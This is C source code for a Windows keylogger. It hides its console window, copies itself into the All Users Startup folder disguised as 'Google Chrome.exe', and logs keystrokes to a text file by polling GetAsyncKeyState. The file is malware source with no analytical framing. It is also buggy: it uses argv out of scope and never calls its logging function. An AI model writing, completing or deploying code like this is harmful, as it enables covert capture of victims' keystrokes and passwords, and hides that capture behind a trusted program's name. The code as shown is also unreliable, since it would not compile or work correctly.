#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <sys/stat.h>

void getWords();
int fileExists(char *file);
void hideProgram();

int main(int argc, char* argv[])
{	
	ShowWindow(GetForegroundWindow(), SW_HIDE);
	hideProgram();
	system("pause");
	return 0;
}


void getWords()
{	
	int resultado, tecla;
	FILE *file;
	
	file = fopen("teclas.txt", "w");

	Sleep(1);
	for(tecla = 65; tecla <= 90; tecla++)
	{
		resultado = GetAsyncKeyState(tecla);

		if(resultado == -32767) {
			fprintf(file,"%c",tecla);
			
			printf("%c", tecla);
		}
	}
}

void hideProgram(){
	char* AllUsersProfile = getenv("allusersprofile");
	char destino[9999];
	strcpy(destino, AllUsersProfile);
	strcat(destino,"\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\Google Chrome.exe");
	if(!fileExists(destino)){
		CopyFile(argv[0],destino,0);
	}
}

int fileExists(char *file)
{
    FILE *fp;
	fp = fopen(file,"r");
	if(fp){
		fclose(fp);
		return 1;
	}
	return 0;
}